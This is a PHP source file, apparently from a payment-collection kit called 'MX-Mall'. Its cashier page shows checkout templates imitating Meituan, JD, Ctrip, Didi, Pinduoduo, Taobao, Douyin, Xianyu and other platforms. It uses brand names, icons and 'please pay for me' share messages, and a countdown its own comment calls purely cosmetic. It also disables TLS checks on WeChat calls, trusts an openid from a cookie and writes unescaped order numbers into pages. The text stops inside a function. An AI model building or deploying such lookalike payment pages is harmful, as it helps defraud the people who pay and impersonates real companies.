<?php
/**
 * MX-Mall - Cashier Page (Template Integration)
 *
 * Unified entry point that loads cashier templates based on the `tpl` parameter.
 * All order data is queried ONCE here, then passed to templates via variables.
 * Templates no longer perform their own database queries.
 */
$lockFile = __DIR__ . '/../install/install.lock';
if (!file_exists($lockFile)) {
    header('Location: /install.php');
    exit;
}

// 禁止缓存，确保支付完成后跳转回来能获取最新订单状态
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

// Load DB class before anything else
require_once __DIR__ . '/../config/database.php';
require_once __DIR__ . '/../config/Crypto.php';

$tradeNo = isset($_GET['trade_no']) ? trim($_GET['trade_no']) : '';
$tpl = isset($_GET['tpl']) ? trim($_GET['tpl']) : 'meituan';

// 支持加密参数（优先使用加密参数）
if (isset($_GET['data']) && !empty($_GET['data'])) {
    $decrypted = Crypto::decrypt($_GET['data']);
    if ($decrypted) {
        parse_str($decrypted, $params);
        if (!empty($params['trade_no'])) $tradeNo = $params['trade_no'];
        if (!empty($params['tpl'])) $tpl = $params['tpl'];
    }
}

// 支付平台回调时会在URL后追加参数（pid, trade_no, out_trade_no等）
// 优先使用 out_trade_no（支付平台回调带的我们的订单号）
if (isset($_GET['out_trade_no']) && !empty($_GET['out_trade_no'])) {
    $tradeNo = trim($_GET['out_trade_no']);
}
// 如果 trade_no 不是 NX 开头，说明是支付平台的订单号，尝试用 out_trade_no
if ($tradeNo && strpos($tradeNo, 'NX') !== 0 && isset($_GET['out_trade_no'])) {
    $tradeNo = trim($_GET['out_trade_no']);
}

$validTemplates = ['meituan','jd','ctrip-flight','didi','pdd','taobao','ctrip-hotel','fliggy','dewu','maoyan','taobao2','douyin','didi2','xianyu'];
if (!in_array($tpl, $validTemplates)) {
    $tpl = 'meituan';
}

$tplFile = __DIR__ . '/../templates/cashier/' . $tpl . '.php';
if (!file_exists($tplFile)) {
    echo '<h3>Template not found</h3>';
    exit;
}

// Template brand info for page title
$tplNames = [
    'meituan' => '美团外卖',
    'jd' => '京东',
    'ctrip-flight' => '携程机票',
    'didi' => '滴滴出行',
    'pdd' => '拼多多',
    'taobao' => '淘宝',
    'ctrip-hotel' => '携程酒店',
    'fliggy' => '飞猪旅行',
    'dewu' => '得物',
    'maoyan' => '猫眼电影',
    'taobao2' => '淘宝好物',
    'douyin' => '抖音商城',
    'didi2' => '滴滴Pro',
    'xianyu' => '闲鱼',
];
$tplName = $tplNames[$tpl] ?? '收银台';

// Provide $trade_no for templates (templates use underscore naming)
$trade_no = $tradeNo;

// =============================================
// Unified order query (templates will skip their own query)
// =============================================
$order = null;
$payer_avatar = '';
$payer_nick = '';
try {
    $db = DB::getInstance();
    $order = $db->getRow(
        "SELECT o.*, p.name as product_name, p.image, p.price, p.shop_name,
                u.nickname as user_nick, u.avatar as user_avatar,
                UNIX_TIMESTAMP(o.created_at) as created_ts
         FROM orders o
         LEFT JOIN products p ON o.product_id = p.id
         LEFT JOIN users u ON o.share_user_id = u.id
         WHERE o.out_trade_no = ?",
        [$tradeNo]
    );
    if ($order) {
        $payer_avatar = $order['user_avatar'] ?: '/static/image/youke.png';
        $payer_nick = $order['user_nick'] ?: '用户';
        // Ensure image field is populated
        if (empty($order['image']) && !empty($order['product_image'])) {
            $order['image'] = $order['product_image'];
        }
    }
} catch (Exception $e) {
    // DB query failed
}

if (!$order) {
    echo "<h3>订单不存在</h3>";
    exit;
}

// =============================================
// Parse multi-item orders
// =============================================
$order_items = [];
$is_multi_item = false;
if (!empty($order['items'])) {
    $decoded = json_decode($order['items'], true);
    if (is_array($decoded) && count($decoded) > 1) {
        $order_items = $decoded;
        $is_multi_item = true;
        $order['product_name'] = "打包购买 " . count($order_items) . " 件商品";
    }
}

// =============================================
// Share configuration
// =============================================
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') ||
            (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')
            ? "https://" : "http://";
$base_url = $protocol . $_SERVER['HTTP_HOST'];
$share_url = $base_url . '/cashier.php?trade_no=' . $trade_no . '&tpl=' . $tpl;

// Template-specific share info
$share_titles = [
    'meituan' => '美团外卖',
    'jd' => '京东代付',
    'ctrip-flight' => '携程代付',
    'didi' => '滴滴代付',
    'pdd' => '拼多多代付',
    'taobao' => '淘宝代付',
    'ctrip-hotel' => '携程酒店',
    'fliggy' => '飞猪代付',
    'dewu' => '得物代付',
    'maoyan' => '猫眼代付',
    'taobao2' => '淘宝好物',
    'douyin' => '抖音代付',
    'didi2' => '滴滴Pro',
    'xianyu' => '闲鱼',
];
$share_descs = [
    'meituan' => 'Hi~你和我的距离只差一顿外卖~',
    'jd' => 'Hi~帮我付一下这个订单吧~',
    'ctrip-flight' => '帮我付一下机票钱~',
    'didi' => '帮我付一下车费~',
    'pdd' => '帮我砍一刀，顺便付一下~',
    'taobao' => '帮我付一下这个宝贝~',
    'ctrip-hotel' => '帮我付一下房费~',
    'fliggy' => '帮我付一下旅行费用~',
    'dewu' => '帮我付一下这个潮品~',
    'maoyan' => '帮我买张电影票~',
    'taobao2' => '这个好物推荐给你~',
    'douyin' => '帮我付一下这个订单~',
    'didi2' => '帮我付一下行程费~',
    'xianyu' => '帮我看看这个宝贝~',
];
$share_title = $share_titles[$tpl] ?? '收银台';
$share_desc = $share_descs[$tpl] ?? '帮我付一下这个订单~';
$share_icon = $base_url . '/static/image/' . $tpl . '.png';
$poster_bg = $base_url . '/static/image/' . $tpl . 'hb.png';
$payer_slogan = $share_desc;

// =============================================
// Countdown: 从配置读取订单有效期（分钟），默认15分钟
// 倒计时仅作为展示效果，不影响支付功能
// 注意：所有模板应统一使用 $remaining_seconds <= 0 判断过期
//       倒计时从订单创建时间开始计算，超过配置的有效期后显示过期
// =============================================
// 使用 MySQL 的 UNIX_TIMESTAMP 获取创建时间戳，避免 PHP/MySQL 时区不一致问题
$created_time = intval($order['created_ts']) ?: time();
try {
    $expireMinutes = $db->getOne("SELECT config_value FROM `system_config` WHERE config_key = 'order_expire_minutes'");
    $expireMinutes = intval($expireMinutes) ?: 15;
} catch (Exception $e) {
    $expireMinutes = 15;
}

// 计算剩余秒数
$remaining_seconds = ($created_time + $expireMinutes * 60) - time();
if ($remaining_seconds < 0) $remaining_seconds = 0;

// 已支付的订单不需要倒计时
if ((int)$order['status'] === 1) $remaining_seconds = 0;

// 标记：订单是否仍可支付（status=0 始终可支付，不管倒计时）
$order_payable = ((int)$order['status'] === 0) ? true : false;

// =============================================
// WeChat OAuth - 仅处理回调，不在页面加载时自动跳转
// 点击支付按钮时由JS判断是否需要跳转OAuth获取openid
// 这样避免页面加载时的重定向导致微信浏览器出现双返回按钮
// =============================================
$wx_openid = '';
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$is_wechat = (strpos($ua, 'MicroMessenger') !== false);
$auto_pay = !empty($_GET['auto_pay']) ? true : false;

$currentPayChannel = '';
try {
    $currentPayChannel = $db->getOne("SELECT config_value FROM system_config WHERE config_key = 'pay_channel'");
} catch (Exception $e) {}

$wxAppid = '';
$wxAppsecret = '';
$wxOauthMode = '';
$wxOauthUrl = '';

if ($is_wechat && $order_payable && $currentPayChannel === 'wxpay') {
    try {
        $wxAppid = $db->getOne("SELECT config_value FROM system_config WHERE config_key = 'wx_appid'");
        $wxAppsecret = $db->getOne("SELECT config_value FROM system_config WHERE config_key = 'wx_appsecret'");
        $wxOauthMode = $db->getOne("SELECT config_value FROM system_config WHERE config_key = 'wx_oauth_mode'");
        $wxOauthUrl = $db->getOne("SELECT config_value FROM system_config WHERE config_key = 'wx_oauth_url'");
    } catch (Exception $e) {}

    if (!empty($wxAppid) && !empty($wxAppsecret)) {
        $oauthCallback = false;
        $oauthError = '';

        if (!empty($_GET['code']) && isset($_GET['state']) && $_GET['state'] === 'wxpay') {
            $oauthCallback = true;
            $code = trim($_GET['code']);
            $tokenUrl = "https://api.weixin.qq.com/sns/oauth2/access_token?appid={$wxAppid}&secret={$wxAppsecret}&code={$code}&grant_type=authorization_code";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $tokenUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            $tokenRes = curl_exec($ch);
            $curlErrno = curl_errno($ch);
            $curlError = curl_error($ch);
            curl_close($ch);
            if ($tokenRes && !$curlErrno) {
                $tokenData = json_decode($tokenRes, true);
                if (!empty($tokenData['openid'])) {
                    $wx_openid = $tokenData['openid'];
                    setcookie('wx_openid', $wx_openid, time() + 86400 * 30, '/', '', false, true);
                    if (isset($order['user_id']) && intval($order['user_id']) > 0) {
                        try {
                            $db->update('users', ['openid' => $wx_openid], 'id = ?', [intval($order['user_id'])]);
                        } catch (Exception $e) {}
                    }
                } else {
                    $oauthError = isset($tokenData['errmsg']) ? $tokenData['errmsg'] : 'openid为空';
                    if (isset($tokenData['errcode'])) {
                        $oauthError .= ' (errcode:' . $tokenData['errcode'] . ')';
                    }
                }
            } else {
                $oauthError = $curlErrno ? '网络请求失败: ' . $curlError : '微信接口无响应';
            }
        }

        if (empty($wx_openid) && !empty($_COOKIE['wx_openid'])) {
            $wx_openid = $_COOKIE['wx_openid'];
        }

        if (empty($wx_openid) && isset($order['user_id']) && intval($order['user_id']) > 0) {
            try {
                $userOpenid = $db->getOne("SELECT openid FROM users WHERE id = ?", [intval($order['user_id'])]);
                if (!empty($userOpenid)) {
                    $wx_openid = $userOpenid;
                }
            } catch (Exception $e) {}
        }
    }
}

// =============================================
// WeChat JSSDK - 获取签名配置
// =============================================
$jsConfig = null;
function get_wx_js_config() {
    $db = DB::getInstance();
    $appId = $db->getOne("SELECT config_value FROM system_config WHERE config_key = 'wx_appid'");
    $appSecret = $db->getOne("SELECT config_value FROM system_config WHERE config_key = 'wx_appsecret'");
    if (empty($appId) || empty($appSecret)) return null;

    // 获取 access_token（缓存到文件，2小时过期）
    $tokenFile = __DIR__ . '/../runtime/wx_access_token.json';
    $tokenData = null;
    if (file_exists($tokenFile)) {
        $tokenData = json_decode(file_get_contents($tokenFile), true);
        if ($tokenData && isset($tokenData['expires_at']) && time() < $tokenData['expires_at']) {
            $accessToken = $tokenData['access_token'];
        }
    }
    if (empty($accessToken)) {
        $tokenUrl = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid={$appId}&secret={$appSecret}";
        $tokenRes = @file_get_contents($tokenUrl);
        if (!$tokenRes) return null;
        $tokenJson = json_decode($tokenRes, true);
        if (empty($tokenJson['access_token'])) return null;
        $accessToken = $tokenJson['access_token'];
        @file_put_contents($tokenFile, json_encode([
            'access_token' => $accessToken,
            'expires_at' => time() + 7000,
        ]));
    }

    // 获取 jsapi_ticket（缓存到文件，2小时过期）
    $ticketFile = __DIR__ . '/../runtime/wx_jsapi_ticket.json';
    $ticketData = null;
    if (file_exists($ticketFile)) {
        $ticketData = json_decode(file_get_contents($ticketFile), true);
        if ($ticketData && isset($ticketData['expires_at']) && time() < $ticketData['expires_at']) {
            $jsapiTicket = $ticketData['jsapi_ticket'];
        }
    }
    if (empty($jsapiTicket)) {
        $ticketUrl = "https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token={$accessToken}&type=jsapi";
        $ticketRes = @file_get_contents($ticketUrl);
        if (!$ticketRes) return null;
        $ticketJson = json_decode($ticketRes, true);
        if (empty($ticketJson['ticket'])) return null;
        $jsapiTicket = $ticketJson['ticket'];
        @file_put_contents($ticketFile, json_encode([
            'jsapi_ticket' => $jsapiTicket,
            'expires_at' => time() + 7000,
        ]));
    }

    // 生成签名 - iOS微信签名URL必须与WebView首次加载的URL完全一致
    // 不能用 $_SERVER['REQUEST_URI']，因为微信iOS会追加 &from=xxx 等参数
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || ($_SERVER['SERVER_PORT'] ?? 80) == 443 ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    // 手动构建干净的URL，只保留核心参数 trade_no 和 tpl
    $url = $protocol . '://' . $host . '/cashier.php?trade_no=' . urlencode($tradeNo) . '&tpl=' . urlencode($tpl);
    $nonceStr = substr(md5(uniqid(mt_rand(), true)), 0, 16);
    $timestamp = (string)time();
    $signStr = "jsapi_ticket={$jsapiTicket}&noncestr={$nonceStr}&timestamp={$timestamp}&url={$url}";
    $signature = sha1($signStr);

    return [
        'appId'     => $appId,
        'timestamp' => $timestamp,
        'nonceStr'  => $nonceStr,
        'signature' => $signature,
    ];
}

try {
    $jsConfig = get_wx_js_config();
} catch (Exception $e) {}

// Manager tools (hidden)
$show_manager_tools = false;

// =============================================
// Execute template with output buffering
// =============================================
ob_start();
include $tplFile;
$tplOutput = ob_get_clean();

// =============================================
// Extract <style> content from template output
// =============================================
$tplStyles = '';
if (preg_match_all('/<style[^>]*>(.*?)<\/style>/si', $tplOutput, $styleMatches)) {
    foreach ($styleMatches[1] as $styleContent) {
        $tplStyles .= $styleContent . "\n";
    }
}

// =============================================
// Extract <body> content from template output
// =============================================
$tplBody = '';
if (preg_match('/<body[^>]*>(.*?)<\/body>/si', $tplOutput, $bodyMatch)) {
    $tplBody = $bodyMatch[1];
} else {
    // Fallback: remove everything outside body
    $tplBody = preg_replace('/<!DOCTYPE[^>]*>/i', '', $tplOutput);
    $tplBody = preg_replace('/<html[^>]*>/i', '', $tplBody);
    $tplBody = preg_replace('/<\/html>/i', '', $tplBody);
    $tplBody = preg_replace('/<head>.*?<\/head>/si', '', $tplBody);
    $tplBody = preg_replace('/<body[^>]*>/i', '', $tplBody);
    $tplBody = preg_replace('/<\/body>/i', '', $tplBody);
}

// Remove <style> tags from body content (already extracted to head)
$tplBody = preg_replace('/<style[^>]*>.*?<\/style>/si', '', $tplBody);

// Remove jweixin external script
$tplBody = preg_replace('/<script[^>]*src=["\'][^"\']*jweixin[^"\']*["\'][^>]*><\/script>/i', '', $tplBody);

// =============================================
// Get order data for JS
// =============================================
$orderForJs = $order;
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
    <title><?php echo htmlspecialchars($tplName); ?></title>
<?php
// 微信分享图片：固定使用品牌图片
$share_img = $base_url . '/static/image/meituan.png';
$tplIconMap = [
    'meituan' => 'meituan.png', 'jd' => 'jingdong.png',
    'ctrip-flight' => 'xiecheng.png', 'ctrip-hotel' => 'xiecheng.png',
    'didi' => 'didi.png', 'pdd' => 'pinduoduo.png',
    'taobao' => 'taobao.png', 'fliggy' => 'feizhu.png',
    'dewu' => 'dewu.png', 'maoyan' => 'maoyan.png',
    'taobao2' => 'taobaohaowu.png', 'douyin' => 'douyin.png',
    'didi2' => 'didipro.png', 'xianyu' => 'xianyu.png',
];
if (isset($tplIconMap[$tpl])) {
    $share_img = $base_url . '/static/image/' . $tplIconMap[$tpl];
}
?>
    <meta property="og:title" content="<?php echo htmlspecialchars($share_title); ?>">
    <meta property="og:description" content="<?php echo htmlspecialchars($share_desc); ?>">
    <meta property="og:image" content="<?php echo $share_img; ?>">
    <meta property="og:image:width" content="200">
    <meta property="og:image:height" content="200">
    <meta property="og:url" content="<?php echo $share_url; ?>">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="<?php echo htmlspecialchars($share_title); ?>">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.min.css">
    <?php if ($jsConfig): ?>
    <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
    <script>
    wx.config({
        debug: false,
        appId: '<?php echo $jsConfig["appId"]; ?>',
        timestamp: <?php echo (int)$jsConfig["timestamp"]; ?>,
        nonceStr: '<?php echo $jsConfig["nonceStr"]; ?>',
        signature: '<?php echo $jsConfig["signature"]; ?>',
        jsApiList: ['updateAppMessageShareData', 'updateTimelineShareData', 'onMenuShareAppMessage', 'onMenuShareTimeline', 'onMenuShareQQ', 'onMenuShareWeibo', 'checkJsApi']
    });
    wx.ready(function() {
        console.log('wx.ready 触发成功');
        // 先检查API是否可用
        wx.checkJsApi({
            jsApiList: ['updateAppMessageShareData', 'onMenuShareAppMessage'],
            success: function(res) {
                console.log('checkJsApi:', JSON.stringify(res));
            }
        });
        var shareData = {
            title: '<?php echo addslashes($share_title); ?>',
            desc: '<?php echo addslashes($share_desc); ?>',
            link: '<?php echo $share_url; ?>',
            imgUrl: '<?php echo $share_img; ?>',
            success: function() { console.log('分享成功回调'); },
            cancel: function() { console.log('取消分享回调'); },
            fail: function(err) { console.log('分享失败:', JSON.stringify(err)); }
        };
        // 新版API
        wx.updateAppMessageShareData({
            title: shareData.title,
            desc: shareData.desc,
            link: shareData.link,
            imgUrl: shareData.imgUrl,
            success: function() { console.log('updateAppMessageShareData 成功'); },
            fail: function(err) { console.log('updateAppMessageShareData 失败:', JSON.stringify(err)); }
        });
        wx.updateTimelineShareData({
            title: shareData.title,
            link: shareData.link,
            imgUrl: shareData.imgUrl,
            success: function() { console.log('updateTimelineShareData 成功'); },
            fail: function(err) { console.log('updateTimelineShareData 失败:', JSON.stringify(err)); }
        });
        // 兼容旧版微信客户端
        wx.onMenuShareAppMessage(shareData);
        wx.onMenuShareTimeline({
            title: shareData.title,
            link: shareData.link,
            imgUrl: shareData.imgUrl
        });
    });
    wx.error(function(res) {
        console.log('wx.config error:', JSON.stringify(res));
    });
    </script>
    <?php endif; ?>
    <?php echo '<style>' . $tplStyles . '</style>'; ?>
</head>
<body>
<script>
if (window.top !== window.self) {
    window.top.location.replace(window.self.location.href);
}
</script>
<?php echo $tplBody; ?>

<?php if (!empty($oauthError)): ?>
<div id="wx-oauth-error" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);z-index:99999;align-items:center;justify-content:center;">
    <div style="width:85%;max-width:340px;background:#fff;border-radius:16px;padding:28px 24px;text-align:center;">
        <div style="font-size:40px;margin-bottom:12px;">⚠️</div>
        <div style="font-size:16px;font-weight:600;color:#333;margin-bottom:12px;">微信授权失败</div>
        <div style="font-size:13px;color:#666;line-height:1.6;margin-bottom:20px;"><?php echo htmlspecialchars($oauthError); ?></div>
        <button onclick="retryWxOauth()" style="width:100%;height:42px;border-radius:21px;background:linear-gradient(135deg,#07c160,#06ad56);color:#fff;font-size:15px;font-weight:600;border:none;cursor:pointer;margin-bottom:10px;">重新授权</button>
        <div onclick="document.getElementById('wx-oauth-error').style.display='none'" style="font-size:13px;color:#bbb;cursor:pointer;">关闭</div>
    </div>
</div>
<script>
function retryWxOauth() {
    var url = window.location.href.split('?')[0];
    var newUrl = url + '?trade_no=<?php echo urlencode($tradeNo); ?>&tpl=<?php echo urlencode($tpl); ?>&_retry=' + Date.now();
    window.location.replace(newUrl);
}
document.getElementById('wx-oauth-error').style.display = 'flex';
</script>
<?php endif; ?>

<!-- MX-Mall Floating Share Button -->
<div id="cp-float-share" onclick="openShareModal()" title="分享给好友代付">
    <i class="bi bi-share"></i>
    <span>代付</span>
</div>
<style>
#cp-float-share {
    position: fixed; bottom: 100px; right: 16px; z-index: 9990;
    width: 56px; height: 56px; border-radius: 50%;
    background: linear-gradient(135deg, #6C5CE7, #A29BFE);
    color: #fff; display: flex; flex-direction: column;
    align-items: center; justify-content: center;
    box-shadow: 0 6px 24px rgba(108,92,231,0.4);
    cursor: pointer; font-size: 12px; gap: 2px;
    transition: transform 0.2s ease, box-shadow 0.2s ease;
    -webkit-tap-highlight-color: transparent;
    user-select: none; -webkit-user-select: none;
}
#cp-float-share:active {
    transform: scale(0.92);
    box-shadow: 0 4px 16px rgba(108,92,231,0.3);
}
#cp-float-share i { font-size: 18px; }
#cp-float-share span { font-size: 10px; font-weight: 600; letter-spacing: 1px; }
</style>

<!-- MX-Mall Share Modal -->
<div id="cp-share-modal" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);z-index:9999;align-items:center;justify-content:center;" onclick="this.style.display='none'">
    <div style="width:88%;max-width:360px;background:#fff;border-radius:16px;padding:0;text-align:center;overflow:hidden;" onclick="event.stopPropagation()">
        <div style="display:flex;align-items:center;justify-content:space-between;padding:16px 20px 0;">
            <div style="font-size:17px;font-weight:650;color:#333;">分享给好友代付</div>
            <div onclick="document.getElementById('cp-share-modal').style.display='none'" style="font-size:22px;color:#bbb;cursor:pointer;line-height:1;">&times;</div>
        </div>
        <div style="padding:4px 20px 16px;">
            <!-- Card Preview -->
            <div style="background:#f8f9fa;border-radius:6px;overflow:hidden;text-align:left;margin:12px 0 16px;border:1px solid #eee;">
                <div style="display:flex;align-items:center;padding:12px;">
                    <div style="flex:1;min-width:0;">
                        <div id="cp-card-title" style="font-size:14px;font-weight:600;color:#333;line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;margin-bottom:4px;"></div>
                        <div style="font-size:11px;color:#999;">代付订单 · 点击链接即可支付</div>
                    </div>
                    <img id="cp-card-img" src="" alt="" style="width:48px;height:48px;border-radius:6px;object-fit:cover;flex-shrink:0;margin-left:10px;" onerror="this.style.display='none'">
                </div>
            </div>
            <div style="font-size:12px;color:#999;margin-bottom:12px;">复制链接发送给微信好友，对方打开即可代付</div>
            <div id="cp-share-url" style="background:#f5f5f5;border-radius:8px;padding:10px 12px;font-size:12px;color:#666;word-break:break-all;margin-bottom:12px;text-align:left;max-height:48px;overflow-y:auto;"></div>
            <button onclick="copyShareLink()" style="width:100%;height:44px;border-radius:22px;background:linear-gradient(135deg,#6c5ce7,#00cec9);color:#fff;font-size:15px;font-weight:600;border:none;cursor:pointer;">复制链接</button>
        </div>
    </div>
</div>

<script src="/assets/js/app.js?v=8"></script>
<script src="/assets/js/cashier.js?v=8"></script>
<script>
// =============================================
// MX-Mall - Cashier Integration Script
// =============================================

// Global order data passed from PHP
window.__orderData = <?php echo json_encode($orderForJs, JSON_UNESCAPED_UNICODE); ?>;
window.__tradeNo = '<?php echo htmlspecialchars($tradeNo); ?>';
window.__tpl = '<?php echo htmlspecialchars($tpl); ?>';
window.__payerAvatar = '<?php echo htmlspecialchars($payer_avatar); ?>';
window.__wxOpenid = '<?php echo htmlspecialchars($wx_openid); ?>';
window.__isWechat = <?php echo $is_wechat ? 'true' : 'false'; ?>;
window.__wxAppid = '<?php echo htmlspecialchars($wxAppid); ?>';
window.__wxOauthMode = '<?php echo htmlspecialchars($wxOauthMode); ?>';
window.__wxOauthUrl = '<?php echo htmlspecialchars($wxOauthUrl); ?>';
window.__autoPay = <?php echo $auto_pay ? 'true' : 'false'; ?>;
window.__oauthCallback = <?php echo !empty($oauthCallback) ? 'true' : 'false'; ?>;

// Share card data
window.__shareTitle = '<?php echo addslashes($share_title); ?>';
window.__shareDesc = '<?php echo addslashes($share_desc); ?>';
window.__shareImg = '<?php echo addslashes($share_img); ?>';
window.__shareUrl = '<?php echo addslashes($share_url); ?>';

// =============================================
// Override payment buttons to use MX-Mall payment flow
// =============================================
(function() {
    // Override all <a> tags that are pay buttons
    var payLinks = document.querySelectorAll('a[onclick*="submitPayment"], a[href*="coes.php"], a[href*="submit_pay.php"], a.btn-pay, a.btn-main, a.btn-pdd, a.btn-tb, a.btn-didi, a.btn-ctrip, a.btn-blue, a.btn-pay-cyan, a.btn-pay-now, a.btn-pay-friend');
    payLinks.forEach(function(link) {
        if (link.classList.contains('btn-disabled')) return;
        link.removeAttribute('onclick');
        link.removeAttribute('href');
        link.href = 'javascript:void(0)';
        link.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            if (typeof CashierApp !== 'undefined') {
                CashierApp.submitPayment();
            } else {
                submitPay();
            }
        };
    });

    // Override poster/share buttons
    var posterBtns = document.querySelectorAll('button[onclick*="generatePoster"], button[onclick*="alert"]');
    posterBtns.forEach(function(btn) {
        if (btn.textContent.indexOf('分享') !== -1 || btn.textContent.indexOf('发送') !== -1) {
            btn.onclick = function(e) {
                e.preventDefault();
                openShareModal();
            };
        }
    });

    // Initialize CashierApp with pre-loaded order data (no API call needed)
    if (typeof CashierApp !== 'undefined' && window.__tradeNo) {
        CashierApp.tradeNo = window.__tradeNo;
        CashierApp.tpl = window.__tpl;
        CashierApp.orderData = window.__orderData;
        CashierApp.wxOpenid = window.__wxOpenid || '';
        CashierApp.renderOrderInfo();
    }

    // OAuth回调后清理URL参数并自动触发支付
    if (window.__oauthCallback && window.__wxOpenid) {
        try {
            var cleanUrl = new URL(window.location.href);
            cleanUrl.searchParams.delete('code');
            cleanUrl.searchParams.delete('state');
            cleanUrl.searchParams.delete('auto_pay');
            history.replaceState(null, '', cleanUrl.toString());
        } catch(e) {}

        if (window.__autoPay) {
            setTimeout(function() {
                if (typeof CashierApp !== 'undefined') {
                    CashierApp.submitPayment();
                } else {
                    submitPay();
                }
            }, 600);
        }
    }

    // =============================================
    // 原生JS倒计时（不依赖jQuery，确保倒计时一定能跑）
    // 支持 HH:MM:SS 格式
    // =============================================
    var _cdH = document.getElementById('h');
    var _cdM = document.getElementById('m');
    var _cdS = document.getElementById('s');
    if (_cdM && _cdS) {
        // 读取模板PHP输出的初始值
        var _sec = parseInt(_cdM.textContent) * 60 + parseInt(_cdS.textContent);
        if (isNaN(_sec) || _sec <= 0) _sec = <?php echo isset($remaining_seconds) ? (int)$remaining_seconds : 900; ?>;
        setInterval(function() {
            if (_sec <= 0) return;
            _sec--;
            var hh = Math.floor(_sec / 3600);
            var mm = Math.floor((_sec % 3600) / 60);
            var ss = _sec % 60;
            if (_cdH) { _cdH.textContent = hh < 10 ? '0' + hh : hh; }
            _cdM.textContent = mm < 10 ? '0' + mm : mm;
            _cdS.textContent = ss < 10 ? '0' + ss : ss;
        }, 1000);
    }

    // 其他模板的倒计时元素（非 #m/#s 格式）
    var _timerEls = document.querySelectorAll('#pay-countdown, #timer_display, #time-str, #top-timer, .cp-timer');
    if (_timerEls.length > 0 && !_cdM) {
        var _timerSec = <?php echo isset($remaining_seconds) ? (int)$remaining_seconds : 900; ?>;
        setInterval(function() {
            if (_timerSec <= 0) return;
            _timerSec--;
            var hh = Math.floor(_timerSec / 3600);
            var mm = Math.floor((_timerSec % 3600) / 60);
            var ss = _timerSec % 60;
            var ts = (hh > 0 ? (hh < 10 ? '0' + hh : hh) + ':' : '') + (mm < 10 ? '0' + mm : mm) + ':' + (ss < 10 ? '0' + ss : ss);
            _timerEls.forEach(function(el) { el.textContent = ts; });
        }, 1000);
    }
})();

// =============================================
// Share Functions
// =============================================
function getShareData() {
    return {
        title: window.__shareTitle || document.title,
        desc: window.__shareDesc || '',
        link: window.__shareUrl || window.location.href,
        imgUrl: window.__shareImg || ''
    };
}

function openShareModal() {
    var data = getShareData();

    // 微信内：调用 WeixinJSBridge 直接唤起分享面板（卡片形式）
    if (window.__isWechat && typeof WeixinJSBridge !== 'undefined') {
        WeixinJSBridge.invoke('shareAppMessage', {
            title: data.title,
            desc: data.desc,
            link: data.link,
            img_url: data.imgUrl,
            img_width: '200',
            img_height: '200'
        }, function(res) {
            // 分享完成或取消，无需额外处理
        });
        return;
    }

    // 非微信或 JS Bridge 未就绪：弹窗展示卡片预览 + 复制链接
    document.getElementById('cp-share-url').textContent = data.link;
    document.getElementById('cp-card-title').textContent = data.title;
    var imgEl = document.getElementById('cp-card-img');
    if (data.imgUrl) {
        imgEl.src = data.imgUrl;
        imgEl.style.display = '';
    } else {
        imgEl.style.display = 'none';
    }
    document.getElementById('cp-share-modal').style.display = 'flex';
}

function copyShareLink() {
    var url = document.getElementById('cp-share-url').textContent;
    if (!url) return;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(url).then(function() {
            showCopySuccess();
        }).catch(function() {
            fallbackCopy(url);
        });
    } else {
        fallbackCopy(url);
    }
}

function showCopySuccess() {
    // 反馈动画：按钮变绿
    var btn = document.querySelector('#cp-share-modal button');
    var originalText = btn.textContent;
    var originalBg = btn.style.background;
    btn.textContent = '已复制';
    btn.style.background = 'linear-gradient(135deg,#10b981,#34d399)';
    setTimeout(function() {
        btn.textContent = originalText;
        btn.style.background = originalBg;
        document.getElementById('cp-share-modal').style.display = 'none';
    }, 1200);
}

function fallbackCopy(text) {
    var textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.opacity = '0';
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
        showCopySuccess();
    } catch (e) {
        // 最后兜底：全选文本让用户手动复制
        document.getElementById('cp-share-url').select();
    }
    document.body.removeChild(textarea);
}

// 提前注册 WeixinJSBridge 分享数据（兼容旧版微信分享菜单）
document.addEventListener('WeixinJSBridgeReady', function() {
    var data = getShareData();
    WeixinJSBridge.on('menu:share:appmessage', function(argv) {
        WeixinJSBridge.invoke('sendAppMessage', {
            title: data.title,
            desc: data.desc,
            link: data.link,
            img_url: data.imgUrl
        }, function(res) {});
    });
    WeixinJSBridge.on('menu:share:timeline', function(argv) {
        WeixinJSBridge.invoke('shareTimeline', {
            title: data.title,
            link: data.link,
            img_url: data.imgUrl
        }, function(res) {});
    });
});

// =============================================
// Fallback payment submit (if CashierApp not loaded)
// =============================================
function submitPay() {
    var openid = window.__wxOpenid || '';

    if (window.__isWechat && !openid) {
        if (typeof CashierApp !== 'undefined') {
            CashierApp.redirectToWxOauth();
        } else {
            var appid = window.__wxAppid || '';
            if (!appid) { alert('微信支付配置异常，请联系管理员'); return; }
